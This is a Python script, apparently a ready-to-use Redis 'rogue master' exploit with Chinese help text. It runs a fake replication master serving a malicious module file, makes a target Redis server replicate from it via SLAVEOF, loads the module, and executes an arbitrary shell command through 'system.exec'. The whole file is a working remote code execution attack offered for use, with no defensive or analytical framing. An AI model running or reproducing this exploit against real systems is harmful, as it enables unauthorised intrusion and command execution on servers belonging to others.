import os
import sys
import time
import socket
import logging
import argparse
import threading
import socketserver

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='>> %(message)s')

class RoguoHandler(socketserver.BaseRequestHandler):
    def decode(self, data):
        if data.startswith(b'*'):
            return data.strip().split(b'\r\n')[2::2]
        if data.startswith(b'$'):
            return data.split(b'\r\n', 2)[1]
        return data.strip().split()

    def handle(self):
        while True:
            data = self.request.recv(1024)
            logging.info("receive data: %r", data)
            arr = self.decode(data)
            if arr[0].startswith(b'PING'):
                self.request.sendall(b'+PONG' + b'\r\n')
            elif arr[0].startswith(b'REPLCONF'):
                self.request.sendall(b'+OK' + b'\r\n')
            elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'):
                self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + b'\r\n')
                self.request.sendall(b'$' + str(len(self.server.payload)).encode() + b'\r\n')
                self.request.sendall(self.server.payload + b'\r\n')
                break
        self.finish()

    def finish(self):
        self.request.close()


class RoguoServer(socketserver.TCPServer):
    allow_reuse_address = True
    def __init__(self, server_address, payload):
        super(RoguoServer, self).__init__(server_address, RoguoHandler, True)
        self.payload = payload


class RedisClient(object):
    def __init__(self, rhost, rport):
        self.client = socket.create_connection((rhost, rport), timeout=10)

    def send(self, data):
        data = self.encode(data)
        self.client.send(data)
        logging.info("send data: %r", data)
        return self.recv()

    def recv(self, count=65535):
        data = self.client.recv(count)
        logging.info("receive data: %r", data)
        return data

    def encode(self, data):
        if isinstance(data, bytes):
            data = data.split()

        args = [b'*', str(len(data)).encode()]
        for arg in data:
            args.extend([b'\r\n', b'$', str(len(arg)).encode(), b'\r\n', arg])

        args.append(b'\r\n')
        return b''.join(args)


def decode_command_line(data):
    if not data.startswith(b'$'):
        return data.decode(errors='ignore')

    offset = data.find(b'\r\n')
    size = int(data[1:offset])
    offset += len(b'\r\n')
    data = data[offset:offset+size]
    return data.decode(errors='ignore')


def exploit(auth, target, master, expfile, command):
    if not os.path.exists(expfile):
        sys.exit(f'\033[91m[-] 缺少同步文件!\033[0m')

    lhost, lport = master.strip().split(':', 1)

    with open(expfile, 'rb') as file:
        server = RoguoServer(('0.0.0.0', int(lport)), file.read())
        print(f'\033[96m[+] Server: {lhost}:{lport}, File: {expfile}\033[0m')

    threading.Thread(target=server.handle_request).start()

    if target and command:
        rhost, rport = target.strip().split(':', 1)
        client = RedisClient(rhost, int(rport))
        if auth: client.send([b'AUTH', auth.encode()])

        expfile = os.path.basename(expfile).encode()

        client.send([b'CONFIG', b'SET', b'dbfilename', expfile])
        client.send([b'SLAVEOF', lhost.encode(), lport.encode()])

        time.sleep(2)

        client.send([b'MODULE', b'LOAD', b'./' + expfile])
        client.send([b'SLAVEOF', b'NO', b'ONE'])
        client.send([b'CONFIG', b'SET', b'dbfilename', b'dump.rdb'])
        res = client.send([b'system.exec', command.encode()])
        print(decode_command_line(res))
        client.send([b'MODULE', b'UNLOAD', b'system'])

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--auth", type=str, help="Redis密码")
    parser.add_argument("-t", "--target", type=str, help="目标Redis (eg: 127.0.0.1:6379)")
    parser.add_argument("-m", "--master", type=str, help="Master服务 (eg: 192.168.1.100:9999)", required=True)
    parser.add_argument("-f", "--file", type=str, help="同步文件 (default: module.so)", default='module.so')
    parser.add_argument('-c', '--command', type=str, help='执行命令')
    args = parser.parse_args()

    exploit(args.auth, args.target, args.master, args.file, args.command)
